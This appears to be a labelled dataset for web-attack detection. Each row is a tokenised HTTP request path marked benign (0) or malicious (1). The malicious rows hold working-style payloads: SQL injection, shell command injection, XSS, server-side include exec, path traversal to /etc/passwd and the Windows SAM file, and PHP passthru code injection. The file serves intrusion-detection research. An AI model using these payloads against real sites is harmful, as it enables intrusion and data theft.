request	label
/ cgi-bin / www / delivery / ac . php ? bannerid = -1331909226 + or + 1 = 1 +  --  +  '  ; passthru ( base64_decode (  $ _server [ http_nessus_wjflxwdb ]  )  )  ; die ;  /  * 	1
/ gnu20th / 	0
/ 188538 / 	0
/ string / id = 2 & nombre = jamn + ibrico & precio = 100 /  & cantidad = 63 & b1 = aadir + al + carrito 	1
/ string / modo = entrar & login = haiping & pwd = promanar & remember = on & b1 = entrar 	0
/ string / strings / parameters = perpetuo 	0
/ javascript / corrections . cc 	0
/ javascript / callout . php3 	0
/ string / strings / parameters = wong @ hiperespaa . ly 	0
/ string / strings / parameters = villar de caas 	0
/ 449cf31e57e80 / 	0
"/ string / strings / parameters = "" echo dzxqhg $  (  ( 20 + 46 )  )  $  ( echo dzxqhg ) dzxqhg | "	1
/ redwhtblu / 	0
"/ 9kr0ih0v . dll ?  < meta http-equiv = set-cookie content =  "" testzgnm = 1183 ""  > "	1
/ 185068 / 	0
/ 000094937 / 	0
/ string / strings / parameters = 21  % 	1
"/ help . php ? q =  "" ping \ x0b-w \ x0b8000 \ x0b-n \ x0b1 \ x0b1 . 2 . 3 . 4 & rem \ x0b "	1
/ examples / jsp / checkbox / script / cat_for_gen . php ? ad = 1 & ad_direct =  .  .  /  & m_for_racine =  <  / option >  <  / select >  <  ? phpinfo (  )  ;  ?  > 	1
/ researcharticles_060801 / 	0
/ 2169029 / 	0
/ anachele / 	0
"/ string / strings / parameters = < iframe src =  "" 404 ""  onload =  "" top . frames [ 0 ]  . document . write (  & quot ;  < script > r = new xmlhttprequest (  )  ; r . open (  ' get '  ,  ' http :  /  / xssme . html5sec . org / xssme2 '  , false )  ; r . send ( null )  ; if ( r . status =  = 200 )  { confirm ( r . responsetext . substr ( 150 , 41 )  )  ;  }  <  \  / script >  & quot ;  )  ""  >  <  / iframe > "	1
/ 93217847 / 	0
/ javascript / progress . nsf 	0
"/ string / strings / parameters = <  !  --  # fsize file =  "" ssi . shtml ""   --  > "	1
/ 0963702513p92 / 	0
/ string / strings / parameters = 1 )  )  )  or exp (  ~  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 6270 = 6270 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) x )  )  and  (  (  ( 2230 = 2230 	1
/ vac1l5vm . php ?  < script > cross_site_scripting . nasl <  / script > 	1
/ ci_4697302 / 	0
"/ string / strings / parameters = < iframe src =  "" data : image / svg-xml , "	1
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo eedngd )   &  &  str1 =  $  {  # str }   &  &   [  4 -eq  $  { str1 }   ]   &  &  sleep 1  \  \ 	1
/ cgi-bin /  .  .  \ xc0 \ xaf .  .  /  .  .  \ xc0 \ xaf .  .  / winnt / system32 / cmd . exe ?  / c + dir 	1
/ scripts / edit . jsp ? page = user & editor =  .  .  /  .  .  /  .  .  / install 	1
/ string / strings / parameters = 1 '  )  ; iif ( 5257 = 5257 , 1 , 1 / 0 ) 	1
/ string / modo = insertar & precio = 5151 & b1 = confirmar / 	1
/ string / strings / parameters = 1275136116918867 	0
/ javascript / ws . msg 	0
/ javascript / assets . tgz 	0
/ string / errormsg =  ? 	1
/ javascript / e2fs . class 	0
/ dyntunewp / 	0
/ string / modo = insertar & precio = 5402 & b1 = confirmar 	0
/ main . php ? logout =  '  \ x0dsleep \ x0910 \ x09 # 	1
/ string / strings / parameters = 1 )  )  as jvvs where 9594 = 9594 ; select  ( case when  ( 6276 = 6276 )  then 6276 else 6276 *  ( select 6276 from information_schema . character_sets )  end )  # 	1
/ billblass / 	0
/ cgi-bin / a1disp3 . cgi ?  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
"/ string / strings / parameters = -8777 ""  ""  )  as lalf where 8606 = 8606 or elt ( 4397 = 5823 , 5823 )  -- "	1
/ string / strings / parameters = -8409 %  '  )  or make_set ( 9354 = 9354 , 7185 )  and  (  '  %  '  =  ' 	1
/ kwik_fit / 	0
/ javascript / document . do 	1
/ user_new_2 . php ? home = xxpathxx 	1
/ insider-157 / 	0
/ string / strings / parameters = -9514 )  )  as xdkw where 4975 = 4975 union all select 4975 , 4975 , 4975 , 4975 # 	1
"/ main . php ? logout =  "" ping -w 7000 -n 1 1 . 2 . 3 . 4 & rem "	1
/ doc-7365352 / 	0
/ string / strings / parameters = @ variable 	1
/ string / modo = insertar & precio = 4233 & b1 = confirmar 	0
/ string / strings / parameters = 1 '  union all select null , null , null , null # 	1
/ usr / extensions / get_infochannel . inc . php ? root_path = xxpathxx ? cmd = id ; pwd 	1
"/  /  <  / p >  < body >  < script / src =  "" http :  /  / www . example . com / test ? rnd = q18539236 ""  >  <  / script >  < p > "	1
/ string / strings / parameters = 1 '  )  )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end )  )  and  (  (  ' trzi '  =  ' trzi 	1
/ string / strings / parameters = pico despuig 	0
/ string / strings / parameters = 34347 	0
/ admin / geo_zones . php ? zone =  < script > alert ( 414326083575 )  <  / script > 	1
/ scripts / ion-p . exe ? page = c :  \ winnt \ repair \ sam 	1
/ javascript / unsubscribe . old 	0
/ 1160943414_sxbbb / 	0
/ string / strings / parameters = ros rius 	0
/ javascript / bigip . jsp 	0
/ tf_logo / 	0
"/ string / modo = insertar ""  >  <  !  --  # exec + cmd =  "" dir +  ""  --  >  <  & precio = 8962 & b1 = confirmar "	1
/ msadc /  .  .  \ xc1 \ x1c .  .  \ xc1 \ x1c .  .  \ xc1 \ x1c .  .  \ xc1 \ x1c .  .  \ xc1 \ x1c .  .  / winnt / system32 / cmd . exe ?  / c + dir + c :  \  +  / og 	1
"/ en-us / w4996nr0 . cgi ?  < script > document . cookie =  "" testttvs = 7163 ;  ""  <  / script > "	1
/ scripts / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1192005344 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 -- 	1
"/ jdx255ea . x ?  < script > document . cookie =  "" testziyq = 5055 ;  ""  <  / script > "	1
/ outlook1a / 	0
/ string / strings / parameters = -9588 '  )  )  union all select 7280 , 7280 , 7280 , 7280 , 7280 , 7280 , 7280 , 7280 , 7280 , 7280 -- 	1
/ string / strings / parameters = 7861645517279429 	0
/ string / strings / parameters = ardurn 	0
/ string / str =  $  ( echo yeejeu )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  & 	1
/ string / modo = registro & login = ichizen & password = cailla & nombre = rafaela & apellidos = lemunao + porxas & email = callaway . nererova @ mirallesmoscardo . ca & dni = 55658066k & direccion = c /  + madre + castisima ,  + s / n +  & ciudad = lupiana & cp = 09267 & provincia = alicante & ntc = 6588349336548778 & b1 = registrar 	0
/ string / strings / parameters = pascualino 	0
/ plugins / spamx / editip . admin . class . php ? _conf [ path ]  = xxpathxx 	1
"/ 7o5qp766 . php ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ liverpool-fc / 	0
/ 113615 / 	0
/ string / strings / parameters = c /  cangas del narcea ,  97 ,  12 ? e 	0
/ string / strings / parameters = ; echo $ ifsfrftev $  (  ( 68 + 37 )  )  $  ( echo $ ifsfrftev ) frftev 	1
/ 044966 / 	0
/ javascript / glossary . exe 	1
/ string / strings / parameters = ; echo $ ifsiklhqk $  (  ( 57 + 99 )  )  $  ( echo $ ifsiklhqk ) iklhqk & 	1
/ a-blog / navigation / links . php ? navigation_start = xxpathxx ? 	1
/ 53646780 / 	0
"/ string / strings / parameters = | echo iqbief $  (  ( 77 + 16 )  )  $  ( echo iqbief ) iqbief "" "	1
/ string / strings / parameters = 24717 	0
"/ string / modo = registro & login = goldarin5 <  !  --  # include + file =  "" archivo_secreto ""  +  --  >  & password = pervertir & nombre = lavinia & apellidos = llecha & email = stalmaster @ fotoseroticas . com . edu & dni = 50951157q & direccion = calle + nancales ,  + s / n ,  +  & ciudad = urdazubi / urdax & cp = 24879 & provincia = a + corua & ntc = 1870284741408418 & b1 = registrar "	1
/ 2e8521 / 	0
"/ d44uk9h2 . html ?  < script > document . cookie =  "" testmybc = 2088 ;  ""  <  / script > "	1
/ 20299864 / 	0
"/ en-us / w4996nr0 . do ?  < script > document . cookie =  "" testttvs = 7163 ;  ""  <  / script > "	1
/ string / strings / parameters = '  &  & echo $ ifsmsradt $  (  ( 94 + 98 )  )  $  ( echo $ ifsmsradt ) msradt & 	1
/ string / modo = insertar & precio = 3927 & b1 = confirmar 	0
/ but-fbi1 / 	0
/ 180x100-chile / 	0
/ 1004340707 / 	0
"/ string / strings / parameters = 1 ""  ""  and 6510 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  and  ""  "" wtkx ""  ""  =  ""  "" wtkx "	1
"/ main . php ? logout =  "" ping , -w , 7000 , -n , 1 , 4 . 3 . 2 . 1 | rem , "	1
/ nationalslowdown / 	0
/ 1176064 / 	0
/ javascript / style . bak 	0
/ parkowanie / 	0
/ security_insura / 	0
/ 431177 / 	0
/ string / strings / parameters = 1 )  as clye where 7842 = 7842 and char ( 109 )  |  | char ( 79 )  |  | char ( 70 )  |  | char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 )  , 0 )  , 5000000000 )  , null )  -- 	1
/ buttythumb / 	0
/ acctmgmt / 	0
/ cacti / mail . php ? id =  '  /  *  *  / union /  *  *  / select /  *  *  / 1 , 2 , 1331905235 , 4 --  & blog = 1 	1
/ omnibus_gifts / 	0
/ 06453a / 	0
/ jimi hendrix - purple haze / 	0
/ string / strings / parameters = 9178266136569781 	0
/ esp ? page =  & lt ; script & gt ; alert ( document . cookie )  & lt ;  / script & gt ; 	1
/ string / modo = entrar & login = agen & pwd = jument3 & remember = on & b1 = entrar 	0
/ string / strings / parameters = order by 31337 -- 	1
/ javascript / kernel . vb 	0
/ javascript / document . temp 	1
/  .  .  \  \  { file } 	1
/ string / strings / parameters = c /  historiador manuel salcines 133 ,  6b 	0
/ modules . php ? name = downloads & d_op = viewdownloaddetails & lid = 02 & ttitle =  < script > alert (  ' vulnerable '  )  <  / script > 	1
/ en-us / s7qus4g3 . html ?  < script > cross_site_scripting . nasl <  / script > 	1
/ freewarearena / 	0
/ javascript / web-console . key 	0
/ string / strings / parameters = b6ar1261 	0
/ i2n4v4rl . do ?  < script > cross_site_scripting . nasl <  / script > 	1
/ javascript / en_us 	0
"/ string / strings / parameters = 1 ""  ""  )  where 4951 = 4951 ; select dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 70 )  |  | chr ( 106 )  |  | chr ( 78 )  , 5 )  from dual -- "	1
/ string / strings / parameters = |   [  5 -ne  $  ( echo vazljc  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  / 	1
/ string / strings / parameters = ;  str =  $  ( echo tnpfba )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  ' 	1
/ bodman-50 / 	0
/ social software / 	0
/ xarg_corner_top . php ? xarg = xxpathxx ? 	1
/ 4325890 / 	0
/ croscillbenetellolampshade / 	0
/ current_volcs / 	0
/ string / strings / parameters = 7633 	0
"/ t7tm4m0b . cfm ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = symington @ portaldesign . md 	0
/ menshaircut / 	0
/ include / pear / it_error . php ? basepath = xxpathxx ? 	1
"/ string / strings / parameters = 1 ""  ""  )  where 1705 = 1705 ; select  ( case when  ( 4769 = 4769 )  then 4769 else 4769 *  ( select 4769 from mysql . db )  end )  # "	1
"/ d765w06j . cfc ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = perl 	0
"/ string / strings / parameters = ""  ; echo $ ifsbydvlh $  (  ( 40 + 59 )  )  $  ( echo $ ifsbydvlh ) bydvlh & "	1
/ string / strings / parameters = sait 	0
"/ string / strings / parameters = ""  > xxx < p > yyy "	1
/ javascript /  . htpasswd . sfish / bogus \ x0dskipfish-inject : bogus 	1
/ jimmydean90 / 	0
/ scripts / view_user . php ? list = 1 & letter =  & sort_by =  ' select 	1
/ string / strings / parameters = file :  / c :  / boot . ini 	1
"/ vac1l5vm . jsp ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ 874128 / 	0
/ t_publicpc / 	0
/ 61448516 / 	0
"/ 8t9v8k7x . jsp ?  < script > document . cookie =  "" testhvje = 9403 ;  ""  <  / script > "	1
/ evaluation_committee / 	0
/ 181159 / 	0
/ 20in-monitors / 	0
/ cgi-915 / windmail . exe 	1
/ msg10910868 / 	0
"/ main . php ? stuff =  ""  \ x0asleep \ x098 \ x09 # "	1
/ string / modo = entrar & login = ailee1 & pwd = tableo & remember = off & b1 = entrar 	0
/ examples / jsp / cal / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331904366 & lang_crm =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc / passwd \ x00 	1
/ t_rogueremover / 	0
/ proxy-list / 	0
/ javascript / oracle . tpl 	0
/ 6363_6673 / 	0
"/ ny1b3qq4 . fts ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = sabu35so 	0
/ oldboys-0411 / 	0
/ greyroundedcornerright / 	0
"/ string / strings / parameters = ""  )  or sleep ( __time__ )  =  "" "	1
/ cgi-sys / sensepost . exe ?  / c + dir 	1
/ uwmc02 / 	0
"/ string / strings / parameters = 1 %  ""  ""  union all select null , null , null , null , null -- "	1
"/ string / strings / parameters = 1 ""  ""  )  where 5828 = 5828 or 8384 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  -- "	1
/ www / delivery / ac . php ? bannerid = -1332008596 + or + 1 = 1 +  --  +  '  ; passthru ( base64_decode (  $ _server [ http_nessus_pqgrdtsr ]  )  )  ; die ;  /  * 	1
/ string / modo = registro & login = bradney4 & password = t31331 & nombre = anuar & apellidos = retuerta + fong & email = strucak @ cortell . cat & dni = 65651817l & direccion = poblado + de + regulares + 180 ,  + 1d & ciudad = castro + de + rei & cp = 05659 & provincia = lleida & ntc = 6974700055894599 & b1 = registrar 	0
/ string / strings / parameters = valdovio 	0
/ isp_websiteheader2 / 	0
/ string / strings / parameters = 1 )  ; select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 and  ( 3770 = 3770 	1
/ tk26936-class / 	0
/ string / strings / parameters = 85233754d 	0
/ trustandsafety / 	0
/ 061128-131318 / 	0
"/ string / strings / parameters = -8760 ""  ""  union all select 2309 , 2309 , 2309 , 2309 , 2309 , 2309 , 2309 , 2309 , 2309 # "	1
/ strangedays / 	0
/ javascript / adodb . exe 	1
/ string / strings / parameters = shoemake 	0
"/ 7dbjwpw6 . mscgi ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = crioja 	0
/ carbon-12 / 	0
/ 046415 / 	0
/ string / strings / parameters = ciezar 	0
/ scripts / event_view . php ? eid = 34 union select 660865227 	1
/ scripts / wspd_cgi . sh / wservice = wsbroker1 / webtools / oscommand . w 	1
/ string / strings / parameters = 02838 	0
/ string / strings / parameters = calle carmelo torres ,  102 	0
/  / q99252119 &  # x26 ; q8892 &  # x22 ; q8892 &  # x3c ; q8892 &  # x3e ; q99252119 	1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo yxupuj )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  \  \ 	1
/ string / strings / parameters = 1 %  '  )  and 8189 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  -- 	1
"/ main . php ? stuff =  ""  & ping -w 7000 -n 1 4 . 3 . 2 . 1 & rem "	1
/ string / strings / parameters = rolando 	0
/ mp ' s_surgery / 	1
/ string / strings / parameters = and 0 = benchmark ( 3000000 , md5 ( 1 )  )   -- 	1
/ ifn_readit / 	0
/ top . php ? stuff = del ; q42465427 & rem ; 	1
"/ string / strings / parameters = ""  |  | echo $ ifsbakjom $  (  ( 61 + 8 )  )  $  ( echo $ ifsbakjom ) bakjom | "	1
/ internetowe / 	0
"/ 5qnlm5z2 . dll ?  < script > document . cookie =  "" testsixi = 8451 ;  ""  <  / script > "	1
/ string / strings / parameters = zangn 	0
/ string / modo = entrar & login = o . toole & pwd = 59di51ca1 & remember = off & b1 = entrar 	0
"/ 7dbjwpw6 . htm ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ tcpudp-48 / 	0
/ string / id = 2 & nombre = vino + rioja & precio = 39 /  & cantidad = 60 & b1 = aadir + al + carrito 	1
/ 6163361 / 	0
/ string / strings / parameters = calle colegio mayor goimendi 72 4 ? d 	0
/ msg03689 / 	0
/ johncj / 	0
/ string / strings / parameters = landau silvestre 	0
/ javascript / dbman . properties 	0
/  [ xvid-ita ] ocean ' s / 	1
/ g8nu2yy7 . asp ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ x7pclv4s . x ?  < script > document . cookie =  "" testiulz = 3709 ;  ""  <  / script > "	1
/ examples / jsp / jsp2 / jspx / sysinfo . cgi ? action = systemdoc & name = sysinfo_name_cmd_exec . nasl ; id 	1
"/ main . php ? stuff =  ""  | ping \ xa0-w \ xa09000 \ xa0-n \ xa01 \ xa01 . 2 . 3 . 4 | rem \ xa0 "	1
/ javascript / hop . stackdump 	0
/ string / strings / parameters = '  ;  str =  $  ( echo pupqpk )  ;  str1 =  $  {  # str }  ;  if  [  3 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  & 	1
/ scripts / new_images . php ? order = linpha_order_sql_injection . nasl_1331908811 	1
/ uploadit / 	0
/ string / strings / parameters = nela 	0
/ header-new / 	0
/ string / strings / parameters = or 0 = 0  -- 	1
/ sribcg / 	0
/ opus_dei / 	0
/ string / strings / parameters = carlin 	0
"/ jnt3f86c . cfc ?  < script > document . cookie =  "" testcmax = 9270 ;  ""  <  / script > "	1
/ javascript / password . vbs 	0
/ string / strings / parameters = barby 	0
/ 15122127 / 	0
/ string / strings / parameters = sirevici 	0
/ string / modo = registro & login = simeon & password = cholgua & nombre = devota & apellidos = quinds + parini & email = dorsay @ ustream . cc & dni = 42892408f & direccion = felipe + olvera + s / n + 4 ? g & ciudad = caminomorisco & cp = 47319 & provincia = vila & ntc = 1611608298925836 & b1 = registrar 	0
/ string / strings / parameters = -2569 '  union all select 4484 -- 	1
/ en-us / fo564rei . x ?  < script > cross_site_scripting . nasl <  / script > 	1
/ 000122284 / 	0
/ 102056 / 	0
/ findpost23585 / 	0
/ string / modo = registro & login = tsuyoshi & password = tas9go & nombre = zanobia & apellidos = amescua & email = rougerie @ cincocolores . sd & dni = 88684338h & direccion = plaza + de + la + sevillana ,  + 81 ,  + 5-e & ciudad = altorricn & cp = 46128 & provincia = huesca & ntc = 7892581903274474 & b1 = registrar 	0
/ string / modo = registro & login = suat & password = puerta1entana & nombre = isis & apellidos = piera + atencia & email = cerini . ban @ g @ 2horas . coop & dni = 23679741e & direccion = calle + torre + dels + socors + 29 ,  + 11 ? e & ciudad = quiruelas + de + vidriales & cp = 34419 & provincia = burgos & ntc = 0825075702605085 & b1 = registrar 	1
/ javascript / snoop . exe 	1
/ j425172 / 	0
/ string / modo = entrar & login = gorius & pwd = 027eja & remember = off & b1 = entrar 	0
/ btn_agenda / 	0
/ string / modo = registro & login = rurick5 & password = par4u8i67t3 & nombre = rosngela & apellidos = branchadell + arribas & email = pelletier @ cementosanfranq . hu & dni = 66702102d & direccion = comandante + barja + 84 ,  +  & ciudad = cubillas + de + santa + marta & cp = 24443 & provincia = toledo & ntc = 0227003559920538 & b1 = registrar 	0
